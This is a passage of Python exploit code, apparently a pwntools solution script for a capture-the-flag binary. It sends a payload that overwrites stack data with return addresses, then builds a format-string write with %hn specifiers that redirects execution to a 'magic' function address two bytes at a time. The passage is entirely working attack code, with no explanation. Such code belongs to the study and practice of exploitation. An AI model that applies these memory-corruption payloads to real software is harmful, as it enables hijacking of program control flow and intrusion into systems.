...
payload = b'|'.join([b'', str(LIBC.time(0)).encode(), b'2', b'cc', b'']) + b'c' + b'\x00'*6 + p64(0)*0x10 + p64(ret_addr) + p64(ret_addr+8) + p64(ret_addr+10) + p64(ret_addr+12)
p.sendlineafter(b'> ', payload)
ritd = bin.address + 0x00000000000191E
magic = bin.address + 0x00000000000180A
payload = f'2 %{ritd&0xffff-2}c%{6+0x65}$hn'
word = magic&0xffff
print(hex(word))
payload += f'%{word+0x10000 - ritd&0xffff}c%{6+0x66}$hn'
word2 = magic>>16&0xffff
print(hex(word2))
payload += f'%{word2+0x10000 - word}c%{6+0x67}$hn'
word3 = magic>>32&0xffff
print(hex(word3))
payload += f'%{word3+0x10000 - word2}c%{6+0x68}$hn'
print(len(payload))
